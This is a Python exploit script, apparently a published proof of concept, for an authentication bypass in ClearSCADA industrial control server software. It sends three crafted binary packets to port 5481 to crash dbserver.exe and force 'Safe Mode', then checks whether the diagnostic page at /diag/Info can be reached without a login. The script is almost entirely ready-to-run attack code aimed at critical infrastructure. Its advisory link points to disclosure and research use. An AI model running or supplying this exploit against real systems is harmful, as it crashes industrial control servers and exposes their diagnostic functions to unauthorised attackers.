#!/usr/bin/python
# cs-auby.py
# ClearSCADA Remote Authentication Bypass Exploit
#
# Jeremy Brown
# [jbrown3264/gmail]
#
# Oct 2010 (released Jan 2015)
#
# There is an authentication bypass vulnerability in ClearSCADA that can be
# exploited by triggering an exception in dbserver.exe and taking advantage
# of the way the program handles it.
#
# When an exception in occurs, ClearSCADA enters "Safe Mode". This exposes
# it's diagnostic functions to remote users without requiring a valid login
# as it would normally. A remote attacker could view senstive information
# and possibly modify functions of the server running on the affected host.
#
# This code triggers an exception in dbserver.exe and checks to see if you
# can then access the diagnostic page without authentication.
#
# Tested on ClearSCADA 2010R1 running on Windows
#
# Fix information: http://ics-cert.us-cert.gov/advisories/ICSA-11-173-01
#

import sys
import socket
import httplib
import urllib
from time import sleep

pkt_1=(
"\xfb\x0e\x45\x06\x0e\x00\x00\x00\x18\x00\x00\x00"
"\x49\x00\x50\x00\x20\x00\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00"
"\x2e\x00\x30\x00\x2e\x00\x31\x00\x2c\x00\x20\x00\x53\x00\x65\x00"
"\x73\x00\x73\x00\x69\x00\x6f\x00\x6e\x00\x20\x00\x30\x00\x00\x00"
"\x08\x00\x00\x00"
)

pkt_2=(
"\x00\x00\x00\x00"
"\x26\x00\x00\x00"
"\x08\x00\x00\x00\x0f\x00\x00\x00\x43\x00\x72\x00\x79\x00\x73\x00"
"\x74\x00\x61\x00\x6c\x00\x52\x00\x65\x00\x70\x00\x6f\x00\x72\x00"
"\x74\x00\x73\x00\x00\x00"
)

pkt_3=( # "Exception Occured"
"\x00\x00\x00\x00\xd7\x01\x00\x00\x34\x00\x00\x00\x0d\x00\x00\x00"
"\x09\x00\x00\x00\x43\x00\x50\x00\x72\x00\x6f\x00\x66\x00\x69\x00"
"\x6c\x00\x65\x00\x00\x00\x0e\x00\x00\x00\x43\x00\x50\x00\x72\x00"
"\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x46\x00\x6c\x00\x6f\x00"
"\x61\x00\x74\x00\x00\x00\x0e\x00\x00\x00\x43\x00\x50\x00\x72\x00"
"\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x55\x00\x4c\x00\x6f\x00"
"\x6e\x00\x67\x00\x00\x00\x0d\x00\x00\x00\x43\x00\x50\x00\x72\x00"
"\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x4c\x00\x6f\x00\x6e\x00"
"\x67\x00\x00\x00\x10\x00\x00\x00\x43\x00\x41\x00\x64\x00\xBB\x00" # last w0rd
"\x00\x42\x00\x49\x00\x54\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65"
"\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41"
"\x00\x64\x00\x76\x00\x42\x00\x59\x00\x54\x00\x45\x00\x56\x00\x61"
"\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x11"
"\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x57\x00\x4f\x00\x52"
"\x00\x44\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61"
"\x00\x70\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76"
"\x00\x44\x00\x49\x00\x4e\x00\x54\x00\x56\x00\x61\x00\x6c\x00\x75"
"\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x12\x00\x00\x00\x43"
"\x00\x41\x00\x64\x00\x76\x00\x55\x00\x44\x00\x49\x00\x4e\x00\x54"
"\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70"
"\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x52"
"\x00\x45\x00\x41\x00\x4c\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65"
"\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x13\x00\x00\x00\x43\x00\x41"
"\x00\x64\x00\x76\x00\x44\x00\x4f\x00\x55\x00\x42\x00\x4c\x00\x45"
"\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70"
"\x00\x00\x00\x13\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x53"
"\x00\x74\x00\x72\x00\x69\x00\x6e\x00\x67\x00\x56\x00\x61\x00\x6c"
"\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x0f\x00\x00"
"\x00\x43\x00\x43\x00\x72\x00\x79\x00\x73\x00\x74\x00\x61\x00\x6c"
"\x00\x52\x00\x65\x00\x70\x00\x6f\x00\x72\x00\x74\x00\x00\x00\x00"
)

port=5481
s_port=443


def do_ssl(target,port):
    try:
        conn = httplib.HTTPSConnection(target,port)
        conn._http_vsn = 10
        conn._http_vsn_str = "HTTP/1.0"

        conn.request("GET","/diag/Info")

        resp = conn.getresponse()
        conn.close()
        
    except Exception, error:
        print("Error: %s" % error)
        return None
        
    return resp


def main():
    
    if len(sys.argv)!=2:
         print("Usage: %s <target>" % sys.argv[0])
         sys.exit(0)

    target=sys.argv[1]
    cs=target,port

    print "Checking server status..."

    resp = do_ssl(target,s_port)
    
    if(resp == None):
        return
    
    if(resp.status==301):
        print "Server status is normal.\n"

    elif(resp.status==200):
        print "Server is already in safe mode."
        sys.exit(1)

    elif((resp.status!=301)|(resp.status!=200)):
        print("Server returned %d %s, server state unknown.\nContinuing anyways..\n" % (resp.status,resp.reason))
    
    print("Sending packets to trigger exception...\n")
    
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect(cs)

        sock.send(pkt_1)
        resp_1 = sock.recv(32)

        sock.send(pkt_2)
        resp_2 = sock.recv(32)

        sock.send(pkt_3)
        resp_3 = sock.recv(32)

        sock.close()
        
    except Exception, error:
        print("Error: %s" % error)
        return None

    print("Finished, checking server status again...")

    sleep(1)

    resp = do_ssl(target,s_port)
    
    if(resp == None):
        return
    
    if(resp.status==301):
         print("Server status is still normal, maybe it's patched..\n")

    elif(resp.status==200):
         print("Server entered \"safe\" mode :)\n")
         print("Surf on over to https://%s:443/diag/Info to explore" % target)

    elif((resp.status!=301)|(resp.status!=200)):
         print("Server returned %d %s, server state unknown." % (resp.status,resp.reason))


if __name__ == "__main__":
    main()
